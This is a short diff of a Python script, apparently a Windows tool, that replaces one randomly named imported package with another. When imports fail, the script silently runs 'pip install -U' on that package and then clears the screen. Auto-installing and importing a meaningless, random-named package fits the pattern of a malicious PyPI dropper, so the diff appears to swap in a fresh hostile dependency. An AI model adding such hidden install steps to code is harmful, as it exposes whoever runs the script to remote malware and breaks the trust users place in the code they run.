@@ -4,7 +4,7 @@ try:
     import datetime
     import os
     import requests
-    import cTBGdtEZqxlR
+    import DhBSovDjyaPZ
     from colorama import Fore, Style
     os.system('cls')
 except Exception as e:
@@ -19,12 +19,12 @@ except Exception as e:
     os.system('pip install -U cryptography')
     os.system('pip install -U inquirerpy')
     os.system('pip install -U aiohttp')
-    os.system('pip install -U cTBGdtEZqxlR')
+    os.system('pip install -U DhBSovDjyaPZ')
     os.system('cls')
     import datetime
     import json
     import requests
-    import cTBGdtEZqxlR
+    import DhBSovDjyaPZ
     from colorama import Fore, Style
 
 import time
